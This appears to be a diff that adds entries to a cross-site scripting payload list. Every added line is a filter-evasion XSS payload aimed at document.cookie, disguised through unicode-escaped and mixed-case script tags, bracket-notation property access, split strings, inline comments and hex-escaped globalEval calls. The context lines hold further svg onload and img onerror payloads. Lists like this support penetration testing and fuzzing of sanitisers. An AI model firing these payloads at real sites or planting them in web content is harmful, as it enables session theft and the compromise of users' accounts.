@@ -1,3 +1,17 @@
+%u003c%u002fscript%u003ewhs%u003cScRIPt%u0020a%u003ealert(document%20.%20cookie)%u003c%u002fScRiPt%u003e
+document%20.%20cookie
+%u003c%u002fscript%u003ewhs%u003cScRIPt%u0020a%u003ewindow["document"]["cookie"])%u003c%u002fScRiPt%u003e
+window["document"]["cookie"]
+window["alert"](window["document"]["cookie"]);
+document/*foo*/./*bar*/cookie
+window[%22alert%22](window[%22document%22][%22cookie%22]);
+self["alert"]("foo");
+self["$"]["globalEval"]("alert(1)");
+self["\x24"]
+["\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"]
+("\x61\x6c\x65\x72\x74\x28\x31\x29");
+self[Object.keys(self)[5]]("foo")
+self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])
 <sg onload="alert(1)" <=""svg=""
 test+onfouus='alert(0)'id='xss'
 "><img src onerror=alert(1)>
